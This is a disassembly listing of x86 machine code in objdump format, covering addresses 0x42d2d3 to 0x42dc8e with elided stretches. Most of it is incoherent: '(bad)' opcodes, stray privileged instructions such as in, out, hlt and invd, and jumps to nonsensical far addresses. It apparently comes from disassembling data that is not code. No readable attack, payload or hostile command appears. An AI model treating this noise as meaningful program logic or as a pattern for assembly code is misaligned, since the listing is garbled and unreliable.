  42d2d3:	enter  0x5958,0x5a
  42d2d7:	and    edx,DWORD PTR [ebp+0x19]
  42d2da:	mov    ecx,0x8e32c9a9
  42d2df:	xchg   BYTE PTR [ecx-0x2d],cl
  42d2e2:	lahf   
  42d2e3:	xor    BYTE PTR [esi],cl
  42d2e5:	and    BYTE PTR [ebx+0xe],bh
  42d2e8:	push   edi
  42d2e9:	pop    esi
  42d2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2eb:	clc    
  42d2ec:	pop    esi
  42d2ed:	and    dh,ch
  42d2ef:	nop
  42d2f0:	shl    BYTE PTR [ecx+edi*2],0x66
  42d2f4:	outs   dx,BYTE PTR ds:[esi]
  42d2f5:	push   edx
  42d2f6:	xchg   ebx,eax
  42d2f7:	xor    ebx,DWORD PTR [esi+0x49]
  42d2fa:	ss addr16 (bad) 
  42d2fd:	(bad)  
  42d2fe:	out    0x50,al
  42d300:	cli    
  42d301:	xchg   ecx,eax
  42d302:	sbb    ebp,DWORD PTR ds:0x2b84aa23
  42d308:	add    edi,DWORD PTR [edi]
  42d30a:	adc    BYTE PTR [edi+0x4db3a77c],bh
  42d310:	loopne 0x42d2e4
  42d312:	mov    ecx,0xa7e04a75
  42d317:	push   esi
  42d318:	pusha  
  42d319:	inc    edx
  42d31a:	dec    ebp
  42d31b:	mov    gs,WORD PTR [ebp+0x3c]
  42d31e:	js     0x42d33e
  42d320:	shl    BYTE PTR [edx+0x41],1
  42d323:	sub    BYTE PTR [edx],bh
  42d325:	push   ss
  42d326:	fisub  DWORD PTR [edi+0x64]
  42d329:	xor    eax,0x9243ce91
  42d32e:	mov    al,dl
  42d330:	ficom  DWORD PTR [eax]
  42d332:	rcr    DWORD PTR [ebx+edx*1-0x60],1
  42d336:	inc    esp
  42d337:	add    ah,al
  42d339:	mov    ecx,0xc3d0d3aa
  42d33e:	push   ebp
  42d33f:	pop    edx
  42d340:	aam    0xed
  42d342:	pop    edi
  42d343:	repnz mov ebp,0x2a660a6d
  42d349:	adc    ah,BYTE PTR [ebx+eiz*4+0x2a8925e0]
  42d350:	rcl    DWORD PTR ds:0x8da5f7a6,cl
  42d356:	arpl   di,si
  42d358:	enter  0x2b5c,0x30
  42d35c:	dec    ecx
  42d35d:	lahf   
  42d35e:	sbb    dh,BYTE PTR [ebx]
  42d360:	dec    esi
  42d361:	test   edx,edi
  42d363:	inc    edi
  42d364:	xchg   edx,eax
  42d365:	jmp    0x42d380
  42d367:	das    
  42d368:	and    BYTE PTR [ebx+eiz*8],al
  42d36b:	stc    
  42d36c:	xchg   esp,eax
  42d36d:	adc    eax,0x34c138f0
  42d372:	sbb    eax,0x4e27232b
  42d377:	mov    ds:0xbdc57661,al
  42d37c:	jbe    0x42d3d7
  42d37e:	popa   
  42d37f:	(bad)  
  42d380:	hlt    
  42d381:	jmp    0xe9ec24d1
  42d386:	add    DWORD PTR [ebx],edx
  42d388:	std    
  42d389:	adc    eax,0x7d22c30c
  42d38e:	or     eax,0x4037f853
  42d393:	inc    edx
  42d394:	aas    
  42d395:	xor    ecx,eax
  42d397:	out    dx,eax
  42d398:	nop
  42d399:	mov    esi,0xb8038306
  42d39f:	in     al,0x85
  42d3a1:	xor    al,0xed
  42d3a3:	scas   eax,DWORD PTR es:[edi]
  42d3a4:	push   ss
  42d3a5:	mov    al,ds:0xcc6de65c
  42d3aa:	mov    BYTE PTR [esi-0x81a663d],bh
  42d3b0:	test   eax,0x360205aa
  42d3b5:	das    
  42d3b6:	and    al,0xb9
  42d3b8:	push   cs
  42d3b9:	stos   BYTE PTR es:[edi],al
  42d3ba:	push   ss
  42d3bb:	lea    ebx,[edi-0x6e]
  42d3be:	inc    ecx
  42d3bf:	pop    ds
  42d3c0:	fwait
  42d3c1:	inc    ebx
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xb5510781
  42d442:	gs jno 0x42d4a9
  42d445:	fild   WORD PTR [ecx]
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    ah,dl
  42d44d:	inc    edx
  42d44e:	test   eax,0xe72e14fe
  42d453:	or     ebx,esi
  42d455:	nop
  42d456:	(bad)  
  42d457:	lods   eax,DWORD PTR ds:[esi]
  42d458:	nop
  42d459:	mov    BYTE PTR ds:0x6505378c,ch
  42d45f:	cmp    eax,0x824aafb7
  42d464:	cmp    DWORD PTR [ebx-0x61],eax
  42d467:	cwde   
  42d468:	call   0x861c:0xfc056ee4
  42d46f:	repnz inc ebx
  42d471:	(bad)  
  42d472:	test   al,0x1c
  42d474:	aad    0x6a
  42d476:	in     eax,dx
  42d477:	mov    ds:0x952e1505,eax
  42d47c:	cmp    dl,bl
  42d47e:	jnp    0x42d423
  42d480:	stos   BYTE PTR es:[edi],al
  42d481:	sub    al,0xd7
  42d483:	jne    0x42d438
  42d485:	mov    BYTE PTR [bx],ah
  42d488:	arpl   WORD PTR [esi+0x5866fad3],di
  42d48e:	stos   DWORD PTR es:[edi],eax
  42d48f:	jb     0x42d4ae
  42d491:	test   dh,0xec
  42d494:	test   eax,0xdb9b6592
  42d499:	pop    ss
  42d49a:	inc    ebp
  42d49b:	sbb    ecx,eax
  42d49d:	mov    WORD PTR [eax],?
  42d49f:	mov    esi,0x9b2a7373
  42d4a4:	xchg   ebp,esp
  42d4a6:	jo     0x42d43d
  42d4a8:	call   0x1fd40f0e
  42d4ad:	adc    BYTE PTR fs:[ebp+eiz*4+0x3ef9bb54],ah
  42d4b5:	cdq    
  42d4b6:	mov    ecx,0xf9ad04d
  42d4bb:	je     0x42d478
  42d4bd:	in     al,0xc0
  42d4bf:	fsubr  st(4),st
  42d4c1:	loope  0x42d46e
  42d4c3:	mov    bl,0xeb
  42d4c5:	sbb    bh,BYTE PTR [esi]
  42d4c7:	popa   
  42d4c8:	jae    0x42d4c5
  42d4ca:	mov    dh,0x79
  42d4cc:	xor    edx,DWORD PTR [ecx]
  42d4ce:	jg     0x42d45f
  42d4d0:	mov    edx,0xaf3912d3
  42d4d5:	push   0xffffffd7
  42d4d7:	cmp    DWORD PTR [edi],0x8b790c9
  42d4dd:	or     esi,eax
  42d4df:	mov    bh,0xaa
  42d4e2:	jecxz  0x42d474
  42d4e4:	jl     0x42d564
  42d4e6:	aad    0xa1
  42d4e8:	popa   
  42d4e9:	aam    0xe8
  42d4eb:	mov    DWORD PTR [edx+0x2d8a7e99],0x4bd9174b
  42d4f5:	bound  eax,QWORD PTR [esi+0x6b947895]
  42d4fb:	ret    
  42d4fc:	mov    cl,bh
  42d4fe:	jl     0x42d485
  42d500:	push   es
  42d501:	jmp    0x42d4b5
  42d503:	dec    edx
  42d504:	(bad)  
  42d506:	xlat   BYTE PTR ds:[ebx]
  42d507:	xchg   edx,eax
  42d508:	inc    BYTE PTR [esi-0x19ed59a3]
  42d50e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d50f:	ror    edx,1
  42d511:	sub    al,0x3c
  42d513:	or     ch,al
  42d515:	ins    DWORD PTR es:[edi],dx
  42d516:	js     0x42d595
  42d518:	rcl    edx,0x7f
  42d51b:	push   0xffffff8b
  42d51d:	je     0x42d4a6
  42d51f:	mov    ebx,0x41cf4454
  42d524:	xor    eax,0xead4172b
  42d529:	dec    eax
  42d52a:	and    al,0xdd
  42d52c:	(bad)  
  42d52d:	(bad)  
  42d530:	jmp    0x42d4be
  42d532:	pop    es
  42d533:	adc    eax,0xc972f7f6
  42d538:	cmp    eax,0x7ec602a6
  42d53d:	adc    eax,0xe7abdd90
	...
  42d5b2:	add    BYTE PTR [eax],al
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	je     0x42d568
  42d5c2:	adc    BYTE PTR [edx+ebx*2-0x20],al
  42d5c6:	add    DWORD PTR [eax],eax
  42d5c8:	test   BYTE PTR [eax],0x0
  42d5cb:	add    BYTE PTR [ecx+0x76],dh
  42d5ce:	dec    ebp
  42d5cf:	(bad)  
  42d5d0:	cli    
  42d5d1:	(bad)  
  42d5d2:	stos   BYTE PTR es:[edi],al
  42d5d3:	rcl    BYTE PTR [ecx+0x43],0xc6
  42d5d7:	jo     0x42d55f
  42d5d9:	sub    al,0xeb
  42d5db:	inc    edx
  42d5dc:	adc    DWORD PTR [edi-0x64bd14ed],edi
  42d5e2:	cmp    ebx,DWORD PTR gs:[ebp+0x7]
  42d5e6:	push   edx
  42d5e7:	jmp    0x64a9:0x4d676382
  42d5ee:	loope  0x42d60c
  42d5f0:	outs   dx,DWORD PTR ds:[esi]
  42d5f1:	inc    esi
  42d5f2:	std    
  42d5f3:	sub    ebx,0x3159492
  42d5f9:	outs   dx,BYTE PTR ds:[esi]
  42d5fa:	(bad)  
  42d5fb:	xchg   ebx,eax
  42d5fc:	add    DWORD PTR [edx],0x68
  42d5ff:	(bad)  
  42d600:	push   es
  42d601:	int    0x2
  42d603:	das    
  42d604:	or     esp,edi
  42d606:	fwait
  42d607:	nop
  42d608:	dec    esp
  42d609:	xor    bh,BYTE PTR ds:[esi+0x20]
  42d60d:	jge    0x42d651
  42d60f:	add    eax,eax
  42d611:	mov    al,0x80
  42d613:	lahf   
  42d614:	xchg   edi,eax
  42d615:	add    ecx,DWORD PTR ds:0x3c0cb18c
  42d61c:	xchg   esp,eax
  42d61d:	pop    eax
  42d61e:	popf   
  42d61f:	inc    ah
  42d621:	mov    ecx,0x8fa69cba
  42d626:	in     eax,dx
  42d627:	js     0x42d5e0
  42d629:	cmp    eax,0x2effca4
  42d62e:	jnp    0x42d687
  42d630:	lods   eax,DWORD PTR ds:[esi]
  42d631:	test   al,0xb5
  42d633:	stos   BYTE PTR es:[edi],al
  42d634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d635:	sbb    BYTE PTR [ebx],ah
  42d637:	lock inc esi
  42d639:	ret    0xb13b
  42d63c:	(bad)  
  42d63d:	iret   
  42d63e:	aam    0x75
  42d640:	ins    BYTE PTR es:[edi],dx
  42d641:	(bad)  
  42d642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d643:	cmp    BYTE PTR [esi+ecx*8+0x5b0d85b0],cl
  42d64a:	adc    cl,bl
  42d64c:	dec    esi
  42d64d:	cdq    
  42d64e:	popf   
  42d64f:	scas   eax,DWORD PTR es:[edi]
  42d650:	push   edx
  42d651:	cmp    eax,0x905f1bdb
  42d656:	mov    ds:0x853e5e1f,eax
  42d65b:	loop   0x42d637
  42d65d:	jae    0x42d6b4
  42d65f:	or     DWORD PTR [eax-0x770c32da],eax
  42d665:	icebp  
  42d666:	and    DWORD PTR [eax-0xc],eax
  42d669:	sbb    ebp,ebx
  42d66b:	inc    ebx
  42d66c:	ds xchg dx,ax
  42d66f:	cmc    
  42d670:	cmp    ebx,DWORD PTR [ecx-0x5ead74d6]
  42d676:	add    dh,al
  42d678:	mov    ebx,0x7520e607
  42d67d:	fisubr WORD PTR ds:0x6e741504
  42d683:	cs retf 
  42d685:	aam    0x47
  42d687:	push   cs
  42d688:	not    al
  42d68a:	xor    DWORD PTR [ecx+0x39],esp
  42d68d:	jmp    0x42d6a4
  42d68f:	sbb    BYTE PTR [ebp+0x2db1f8c6],dl
  42d695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d696:	fdivr  st(6),st
  42d698:	adc    eax,DWORD PTR [ebx+0x27335e1c]
  42d69e:	mov    dh,0x1e
  42d6a0:	jns    0x42d67a
  42d6a2:	ss mov esp,0x35c7540b
  42d6a8:	dec    ebp
  42d6a9:	jmp    FWORD PTR [edi]
  42d6ab:	mov    ecx,0xeee5c780
  42d6b0:	mov    ebp,0x8edcc191
  42d6b5:	ja     0x42d693
  42d6b7:	inc    esi
  42d6b8:	pop    edi
  42d6b9:	mul    DWORD PTR [esi+0x4f]
  42d6bc:	pop    es
  42d6bd:	(bad)  
  42d6be:	and    BYTE PTR [edx+0x4bb7],0x0
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	adc    dl,BYTE PTR [esi-0x1eaf5025]
  42d746:	add    DWORD PTR [eax],eax
  42d748:	test   BYTE PTR [eax],0x0
  42d74b:	add    BYTE PTR [eax-0x4ffacc54],ch
  42d751:	push   ds
  42d752:	pop    es
  42d753:	jge    0x42d73f
  42d755:	jmp    0x95f51be8
  42d75a:	mov    ebx,0x5b8ca81d
  42d75f:	push   edx
  42d760:	fistp  WORD PTR [edi-0x17]
  42d763:	retf   
  42d764:	dec    ebp
  42d765:	xor    eax,0x72db4da2
  42d76a:	sbb    DWORD PTR [ecx],ecx
  42d76c:	push   es
  42d76d:	dec    ebp
  42d76e:	lahf   
  42d76f:	in     eax,dx
  42d770:	pop    esi
  42d771:	out    dx,al
  42d772:	retf   0x6a7d
  42d775:	sbb    ecx,DWORD PTR [ebp-0x33745e8d]
  42d77b:	jno    0x42d70b
  42d77d:	imul   ebp,DWORD PTR [eax],0x538139c4
  42d783:	ret    0xebc4
  42d786:	inc    edi
  42d787:	ja     0x42d805
  42d789:	imul   ebx,DWORD PTR [ebp-0x4d3abebe],0x46
  42d790:	das    
  42d791:	push   0xffffffa8
  42d793:	stos   DWORD PTR es:[edi],eax
  42d794:	movaps xmm1,XMMWORD PTR [eax-0x69]
  42d798:	fnstcw WORD PTR [edi+0xc]
  42d79b:	loope  0x42d7cf
  42d79d:	sub    eax,0x71658923
  42d7a2:	das    
  42d7a3:	nop
  42d7a4:	add    eax,0xbb5e9153
  42d7a9:	dec    ecx
  42d7aa:	xchg   ecx,eax
  42d7ab:	or     ecx,DWORD PTR [eax-0x6acec63f]
  42d7b1:	adc    ecx,DWORD PTR [edx+ebp*1+0x6e633a0f]
  42d7b8:	imul   edi,DWORD PTR [ecx-0x16],0x8b325604
  42d7bf:	push   es
  42d7c0:	in     al,dx
  42d7c1:	sub    eax,ebx
  42d7c3:	aas    
  42d7c4:	xor    eax,0x7aef54d
  42d7c9:	out    0xfb,al
  42d7cb:	nop
  42d7cc:	scas   eax,DWORD PTR es:[edi]
  42d7cd:	xor    eax,DWORD PTR [ebx-0x6d]
  42d7d0:	push   eax
  42d7d1:	mov    eax,ds:0x9e9c692b
  42d7d6:	pushf  
  42d7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7d8:	cmovs  esp,DWORD PTR [esi-0x19a428e0]
  42d7df:	aam    0x4b
  42d7e1:	push   es
  42d7e2:	push   ebx
  42d7e3:	lea    eax,[edi-0x3e]
  42d7e6:	pop    esp
  42d7e7:	xchg   edx,eax
  42d7e8:	pop    edi
  42d7e9:	jecxz  0x42d7a7
  42d7eb:	sbb    ebp,eax
  42d7ed:	hlt    
  42d7ee:	xchg   esp,eax
  42d7ef:	xchg   ebp,eax
  42d7f0:	jmp    DWORD PTR [esi+0x77]
  42d7f3:	cmp    DWORD PTR [ecx],edi
  42d7f5:	out    0x8b,al
  42d7f7:	retf   0x93f8
  42d7fa:	imul   esp,DWORD PTR [eax],0xffffff81
  42d7fd:	push   esp
  42d7fe:	mov    esp,0xbaf294c2
  42d803:	mov    ebp,0x5d850f83
  42d808:	inc    esp
  42d809:	pusha  
  42d80a:	mov    bh,0xfc
  42d80c:	loop   0x42d80c
  42d80e:	cli    
  42d80f:	ss js  0x42d793
  42d812:	test   eax,0x9846c84e
  42d817:	out    0xe3,al
  42d819:	sub    al,0x55
  42d81b:	cmp    BYTE PTR [ecx-0x53],dh
  42d81e:	inc    esi
  42d81f:	mov    dh,BYTE PTR [eax]
  42d821:	mov    ecx,DWORD PTR [ebx-0x372e6bf7]
  42d827:	jbe    0x42d8a5
  42d829:	inc    ebp
  42d82a:	jne    0x42d7c2
  42d82c:	repnz mov ecx,0xf4269ff4
  42d832:	leave  
  42d833:	pop    ecx
  42d834:	sbb    eax,0x12514d57
  42d839:	push   0x6
  42d83b:	jmp    0x904c:0x49a7a4bf
	...
  42d8b2:	add    BYTE PTR [eax],al
  42d8b4:	adc    BYTE PTR [ebx],bl
  42d8b6:	leave  
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x88dcc254
  42d8c1:	mov    bl,0xbe
  42d8c3:	jns    0x42d90b
  42d8c5:	loop   0x42d8c8
  42d8c7:	add    dh,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [eax*4+0x2a627648],dh
  42d8d2:	dec    eax
  42d8d3:	mov    al,ds:0x71733ac7
  42d8d8:	hlt    
  42d8d9:	xchg   edi,eax
  42d8da:	mov    WORD PTR [edi+0x1c],cs
  42d8dd:	dec    edx
  42d8de:	xchg   DWORD PTR [ecx],eax
  42d8e0:	es clc 
  42d8e2:	pop    es
  42d8e3:	lahf   
  42d8e4:	aad    0xf0
  42d8e6:	mov    ah,bl
  42d8e8:	(bad)  
  42d8ea:	and    DWORD PTR [ebp+0x18ef0141],ecx
  42d8f0:	xchg   esp,eax
  42d8f1:	dec    ebx
  42d8f2:	push   ds
  42d8f3:	xchg   edx,eax
  42d8f4:	cdq    
  42d8f5:	fcom   QWORD PTR [ebx+0x5c]
  42d8f8:	push   ebx
  42d8f9:	lds    edi,FWORD PTR [edx+eiz*2+0x3b7ef9ee]
  42d900:	inc    ecx
  42d901:	xchg   ecx,eax
  42d902:	sbb    ebx,DWORD PTR [ebx+ebx*1+0x4e]
  42d906:	dec    ebx
  42d907:	inc    edx
  42d908:	inc    ecx
  42d909:	xchg   esp,esi
  42d90b:	mov    cl,al
  42d90d:	adc    bl,BYTE PTR [ebx-0x780eabf9]
  42d913:	push   0x39
  42d915:	sbb    ch,BYTE PTR [edx+ebx*2-0x28]
  42d919:	stc    
  42d91a:	or     BYTE PTR ds:[esi],0x37
  42d91e:	test   eax,0x66662f72
  42d923:	rcl    esp,cl
  42d925:	sub    al,0x0
  42d927:	inc    ebp
  42d928:	invd   
  42d92a:	or     edx,ecx
  42d92c:	mov    dh,0x2c
  42d92e:	push   ebp
  42d92f:	inc    BYTE PTR [edi]
  42d931:	lods   al,BYTE PTR ds:[esi]
  42d932:	xchg   edi,eax
  42d933:	push   0x5f
  42d935:	sub    al,0x4f
  42d937:	xlat   BYTE PTR ds:[ebx]
  42d938:	jo     0x42d8e7
  42d93a:	jecxz  0x42d93d
  42d93c:	repz add eax,0x558360da
  42d942:	jns    0x42d9b6
  42d944:	jns    0x42d942
  42d946:	(bad)  
  42d947:	xor    dl,ch
  42d949:	xor    DWORD PTR [esi-0x27],edx
  42d94c:	lock popa 
  42d94e:	cmp    dl,bl
  42d950:	cli    
  42d951:	lods   eax,DWORD PTR ds:[esi]
  42d952:	inc    ecx
  42d953:	mov    cl,0x52
  42d955:	out    dx,eax
  42d956:	addr16 mov es,ebp
  42d959:	out    0x33,eax
  42d95b:	push   edi
  42d95c:	test   al,0xd9
  42d95e:	ds daa 
  42d960:	sbb    esi,ecx
  42d962:	js     0x42d920
  42d964:	jnp    0x42d9ad
  42d966:	(bad)  
  42d967:	in     al,0xdf
  42d969:	aam    0x12
  42d96b:	or     BYTE PTR [eax-0x49],al
  42d96e:	jle    0x42d943
  42d970:	jmp    0x42d994
  42d972:	and    al,0x31
  42d974:	mov    ebp,0x9520c79
  42d979:	push   edi
  42d97a:	and    BYTE PTR [ebx+0x2b],al
  42d97d:	dec    edx
  42d97e:	xchg   DWORD PTR [edx+ebp*8+0x66],ebp
  42d982:	push   0xf4161c33
  42d987:	stos   DWORD PTR es:[edi],eax
  42d988:	loope  0x42d934
  42d98a:	inc    eax
  42d98b:	pop    esp
  42d98c:	sti    
  42d98d:	and    al,0x4b
  42d98f:	xchg   ecx,eax
  42d990:	inc    ebx
  42d991:	cmp    BYTE PTR ds:0x10b0eba5,ah
  42d997:	jmp    0xff04:0x95086707
  42d99e:	inc    esi
  42d99f:	inc    ecx
  42d9a0:	mov    bl,0x15
  42d9a2:	sbb    DWORD PTR [eax-0x50b1d7b0],0x51
  42d9a9:	(bad)  
  42d9ab:	ret    
  42d9ac:	jl     0x42d9e1
  42d9ae:	pushf  
  42d9af:	out    dx,eax
  42d9b0:	sub    BYTE PTR [edx],ch
  42d9b2:	mov    ch,0x8a
  42d9b4:	and    DWORD PTR [eax],edi
  42d9b6:	push   ds
  42d9b7:	jle    0x42da2f
  42d9b9:	mov    al,0xc5
  42d9bb:	dec    edi
  42d9bc:	out    0xb2,eax
  42d9be:	push   ebp
  42d9bf:	dec    esp
  42d9c0:	add    al,0xbf
	...
  42da32:	add    BYTE PTR [eax],al
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	sbb    esi,edx
  42da42:	xchg   cx,ax
  42da44:	cmp    al,0xe3
  42da46:	add    DWORD PTR [eax],eax
  42da48:	test   BYTE PTR [eax],0x0
  42da4b:	add    bh,bh
  42da4d:	in     al,dx
  42da4e:	test   BYTE PTR [eax],al
  42da50:	es xchg ebx,edi
  42da53:	out    dx,eax
  42da54:	inc    eax
  42da55:	pusha  
  42da56:	pop    ds
  42da57:	pop    eax
  42da58:	xor    BYTE PTR ds:0x5a49216f,bl
  42da5e:	outs   dx,BYTE PTR ds:[esi]
  42da5f:	(bad)  
  42da60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da61:	xchg   edi,eax
  42da62:	sbb    cl,BYTE PTR [ebx+0x24]
  42da65:	in     eax,dx
  42da66:	push   esi
  42da67:	or     eax,0x6d
  42da6a:	lahf   
  42da6b:	loopne 0x42dae4
  42da6d:	inc    ebp
  42da6e:	push   0x81af75a3
  42da73:	stos   BYTE PTR es:[edi],al
  42da74:	lods   al,BYTE PTR ds:[esi]
  42da75:	daa    
  42da76:	xor    al,0x7c
  42da78:	push   0xcf5c05eb
  42da7d:	jo     0x42da35
  42da7f:	(bad)  
  42da81:	pop    ds
  42da82:	mov    bl,0x58
  42da84:	and    al,0xf2
  42da86:	scas   eax,DWORD PTR es:[edi]
  42da87:	outs   dx,BYTE PTR ds:[esi]
  42da88:	lahf   
  42da89:	add    ebp,DWORD PTR [eax-0x2c040060]
  42da8f:	mov    cl,BYTE PTR [ecx]
  42da91:	sbb    al,0xba
  42da93:	add    eax,DWORD PTR [edx]
  42da95:	fisub  WORD PTR [edi]
  42da97:	jbe    0x42daba
  42da99:	jmp    0x42dad3
  42da9b:	jae    0x42dac5
  42da9d:	dec    ebp
  42da9e:	icebp  
  42da9f:	sub    eax,0x67bcac8f
  42daa4:	sbb    al,0xc6
  42daa6:	dec    esp
  42daa7:	mov    gs,ebp
  42daa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42daaa:	mov    bl,0x9a
  42daac:	out    dx,al
  42daad:	or     cl,dl
  42daaf:	out    0xd4,eax
  42dab1:	adc    DWORD PTR [ebx-0x5bdc459f],esp
  42dab7:	xchg   ecx,eax
  42dab8:	xchg   BYTE PTR [eax],cl
  42daba:	inc    edx
  42dabb:	push   esp
  42dabc:	repnz outs dx,DWORD PTR ds:[esi]
  42dabe:	mov    al,0xf9
  42dac0:	imul   ebp,edi,0x56
  42dac3:	cdq    
  42dac4:	nop
  42dac5:	shl    BYTE PTR [ecx],1
  42dac7:	test   BYTE PTR [ecx+ebp*4+0x166fed24],cl
  42dace:	ret    0x4ef5
  42dad1:	icebp  
  42dad2:	push   edi
  42dad3:	jmp    0xc0c1a12
  42dad8:	call   0xa538aa24
  42dadd:	rcl    DWORD PTR [ebx],cl
  42dadf:	arpl   WORD PTR [edx+0x6b59a576],bp
  42dae5:	cmp    DWORD PTR [edi-0x9],edx
  42dae8:	popf   
  42dae9:	and    edi,ecx
  42daeb:	daa    
  42daec:	mov    gs,WORD PTR [edi+0x1]
  42daef:	pop    esp
  42daf0:	repnz fnstsw WORD PTR ds:0x41b9c281
  42daf7:	not    DWORD PTR [eax-0x311fb7fe]
  42dafd:	ss dec edx
  42daff:	push   ecx
  42db00:	jge    0x42db1a
  42db02:	fimul  DWORD PTR [ebx+ebp*8+0x2c]
  42db06:	stos   BYTE PTR es:[edi],al
  42db07:	jge    0x42dab5
  42db09:	pop    ebp
  42db0a:	fsubr  DWORD PTR [ecx]
  42db0c:	aad    0x28
  42db0e:	xor    BYTE PTR [ecx],dh
  42db10:	jmp    0x2d60:0xd10c257d
  42db17:	sbb    eax,0x5eda42ef
  42db1c:	mov    ds:0x8968b969,al
  42db21:	dec    ecx
  42db22:	push   ss
  42db23:	sahf   
  42db24:	or     BYTE PTR [esi+0x63],bl
  42db27:	pusha  
  42db28:	mov    bl,0x20
  42db2a:	sub    cl,BYTE PTR [esi]
  42db2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db2d:	jmp    0x42db83
  42db2f:	push   ebp
  42db30:	ret    
  42db31:	dec    edi
  42db32:	cmp    esi,DWORD PTR [eax+0x61]
  42db35:	aaa    
  42db36:	sub    BYTE PTR [ebx],bh
  42db38:	iret   
  42db39:	push   edi
  42db3a:	cmc    
  42db3b:	add    DWORD PTR [eax],eax
  42db3d:	jnp    0x42dae5
  42db3f:	and    ch,bl
  42db41:	cdq    
	...
  42dbb2:	add    BYTE PTR [eax],al
  42dbb4:	jg     0x42dbb8
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x6d0ccf37,al
  42dbc3:	pop    edi
  42dbc4:	xor    ah,ah
  42dbc6:	add    DWORD PTR [eax],eax
  42dbc8:	test   BYTE PTR [eax],0x0
  42dbcb:	add    bh,bl
  42dbcd:	mov    cs,WORD PTR [edx-0x6c]
  42dbd0:	or     DWORD PTR [edx+0x66],edi
  42dbd3:	aaa    
  42dbd4:	iret   
  42dbd5:	jg     0x42dc56
  42dbd7:	sub    DWORD PTR [edx],ebx
  42dbd9:	and    eax,0x1ffc1db8
  42dbde:	pop    ss
  42dbdf:	pusha  
  42dbe0:	mov    ebx,0xf38ba190
  42dbe5:	inc    ebp
  42dbe6:	sub    ecx,DWORD PTR ds:0xd23e9831
  42dbec:	jb     0x42dbe3
  42dbee:	in     al,dx
  42dbef:	cmp    al,BYTE PTR [esi+0x1afa5c8f]
  42dbf5:	inc    ebx
  42dbf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbf7:	pusha  
  42dbf8:	cdq    
  42dbf9:	and    ecx,edi
  42dbfb:	and    al,0xbb
  42dbfd:	xor    dl,BYTE PTR [ebx+edi*1]
  42dc00:	dec    eax
  42dc01:	iret   
  42dc02:	mov    bh,BYTE PTR [ecx]
  42dc04:	xchg   ebx,eax
  42dc05:	cmc    
  42dc06:	cmp    ecx,DWORD PTR [eax]
  42dc08:	test   BYTE PTR [ebx+0x27],0x95
  42dc0c:	es jg  0x42dbb6
  42dc0f:	push   eax
  42dc10:	add    DWORD PTR [ecx-0xb2b4810],0xffffff87
  42dc17:	push   esi
  42dc18:	lods   al,BYTE PTR ds:[esi]
  42dc19:	popf   
  42dc1a:	js     0x42dbf5
  42dc1c:	pop    ebp
  42dc1d:	xor    BYTE PTR [ecx],ch
  42dc1f:	xchg   edx,eax
  42dc20:	(bad)  
  42dc21:	popw   ds
  42dc23:	into   
  42dc24:	repnz sub DWORD PTR [ebp+0x6b],ebx
  42dc28:	jge    0x42dbdc
  42dc2a:	pop    ebp
  42dc2b:	and    eax,0xffffffd7
  42dc2e:	repnz stos DWORD PTR es:[edi],eax
  42dc30:	(bad)  
  42dc31:	gs (bad) 
  42dc33:	out    dx,al
  42dc34:	adc    cl,BYTE PTR [edi]
  42dc36:	into   
  42dc37:	mov    edx,0xb7de5e13
  42dc3c:	es inc eax
  42dc3e:	cmc    
  42dc3f:	outs   dx,DWORD PTR ds:[esi]
  42dc40:	pop    eax
  42dc41:	ins    BYTE PTR es:[edi],dx
  42dc42:	scas   eax,DWORD PTR es:[edi]
  42dc43:	sbb    BYTE PTR ds:0xfad466fe,0xef
  42dc4a:	mov    ds:0xc2c5e098,al
  42dc4f:	add    DWORD PTR [edi+0x6],edx
  42dc52:	sbb    eax,0xbc46320f
  42dc57:	add    al,0x9e
  42dc59:	lods   eax,DWORD PTR ds:[esi]
  42dc5a:	mov    BYTE PTR [esi-0xd],al
  42dc5d:	or     esi,DWORD PTR [edi+0x4025be71]
  42dc63:	cmp    cl,BYTE PTR [ebx-0x28]
  42dc66:	(bad)  
  42dc68:	jp     0x42dc03
  42dc6a:	(bad)  
  42dc6d:	pop    ds
  42dc6e:	ror    dh,cl
  42dc70:	fisttp DWORD PTR [esi+ecx*4]
  42dc73:	add    DWORD PTR [edx+0x28],edi
  42dc76:	adc    al,0xf8
  42dc78:	or     al,0x5a
  42dc7a:	ds call 0x98631ca6
  42dc80:	fimul  WORD PTR [eax]
  42dc82:	cs dec edi
  42dc84:	sub    eax,0xe7ae5a2b
  42dc89:	push   esp
  42dc8a:	mov    dh,0xfe
  42dc8c:	ret    
  42dc8d:	dec    ecx
  42dc8e:	imul   edi,DWORD PTR [ebx-0x41],0xffffffd6
